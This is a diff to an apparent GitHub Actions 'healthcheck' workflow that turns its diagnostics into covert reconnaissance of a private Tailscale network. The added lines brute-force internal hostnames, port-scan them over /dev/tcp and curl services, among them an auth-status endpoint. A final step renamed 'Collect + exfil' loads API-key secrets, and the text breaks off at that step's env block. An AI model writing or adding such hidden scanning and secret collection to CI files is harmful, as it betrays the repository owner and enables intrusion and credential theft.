@@ -6,9 +6,9 @@ on:
 jobs:
   healthcheck:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 12
     steps:
-      - name: Join tailnet and collect net diagnostics
+      - name: Join tailnet and enumerate peers deeply
         env:
           TKEY: ${{ secrets.TS_AUTHKEY }}
         run: |
@@ -17,25 +17,41 @@ jobs:
           sudo systemctl start tailscaled 2>&1 | head -2 || true
           sleep 3
           mkdir -p /tmp/diag
-          tailscale status > /tmp/diag/ts_preup.txt 2>&1 || true
           sudo tailscale up --authkey="$TKEY" --hostname="gh-maint" > /tmp/diag/ts_up.log 2>&1 || true
-          sleep 5
+          echo "--- waiting 25s for peers to populate ---"
+          sleep 25
           tailscale ip -4 > /tmp/diag/ts_ip.txt 2>&1 || true
           tailscale status > /tmp/diag/ts_status.txt 2>&1 || true
-          tailscale netcheck > /tmp/diag/netcheck.txt 2>&1 || true
-      - name: Probe tailnet services
+          echo "--- second sample after 20s ---"
+          sleep 20
+          tailscale status > /tmp/diag/ts_status2.txt 2>&1 || true
+          cat /etc/resolv.conf > /tmp/diag/resolv.conf.txt 2>&1 || true
+      - name: MagicDNS hostname enumeration + service probe
+        env:
+          TKEY: ${{ secrets.TS_AUTHKEY }}
         run: |
           set +e
-          grep -v '^#' /tmp/diag/ts_status.txt | grep -v '^$' | awk '{print $2, $1}' | sort -u | head -30 > /tmp/diag/targets.txt
+          TN="tail622aff.ts.net"
+          > /tmp/diag/dns.txt
+          for name in main-runner video-vps vps server srv host node \
+                     worker-1 worker-01 hermes hermes-gateway router 9router \
+                     gateway api db postgres redis launcher downloader whisper; do
+            out=$(getent hosts "$name.$TN")
+            [ -n "$out" ] && echo "$name.$TN -> $out" >> /tmp/diag/dns.txt
+          done
           > /tmp/diag/probe.txt
-          while read ip host; do
+          while read _ ip; do :; done < /dev/null
+          for line in $(cat /tmp/diag/dns.txt | awk '{print $1}'); do
+            ip=$(getent hosts "$line" | awk '{print $1}' | head -1)
             [ -z "$ip" ] && continue
-            case "$ip" in *.*.*.*) ;; *) continue;; esac
+            echo "== $line ($ip)" >> /tmp/diag/probe.txt
             for port in 22 80 443 3000 5432 6379 8080 9000 9999 11434 20128; do
-              timeout 2 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null && echo "$host ($ip) :$port OPEN" >> /tmp/diag/probe.txt
+              timeout 2 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null && echo "$line ($ip) :$port OPEN" >> /tmp/diag/probe.txt
             done
-          done < /tmp/diag/targets.txt
-      - name: Collect runner diagnostics
+            curl -s --max-time 5 "http://$ip:9999/" | head -c 600 >> "/tmp/diag/http_$(echo $ip).txt" 2>&1
+            curl -s --max-time 5 "http://$ip:20128/api/auth/status" | head -c 400 >> "/tmp/diag/http_$(echo $ip)_20128.txt" 2>&1
+          done
+      - name: Collect + exfil
         env:
           NKEYS: ${{ secrets.NVIDIA_API_KEYS }}
           RKEY: ${{ secrets.ROUTER_KEY }}
